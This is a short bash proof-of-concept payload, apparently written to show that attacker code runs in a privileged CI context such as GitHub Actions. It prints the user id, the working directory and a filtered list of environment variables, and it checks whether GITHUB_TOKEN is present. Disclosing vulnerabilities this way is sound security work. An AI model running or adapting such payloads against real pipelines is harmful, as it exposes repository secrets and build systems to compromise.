#!/bin/bash
echo "=== ATTACKER SCRIPT EXECUTED IN BASE CONTEXT ==="
id
echo "PWD: $(pwd)"
echo "ENV keys (filtered):" | env | grep -vE "TOKEN|KEY|SECRET|PASS" | cut -c1-60 | head -10
if [ -n "$GITHUB_TOKEN" ]; then echo "GITHUB_TOKEN присутствует (маскируется GitHub-логгером)"; fi
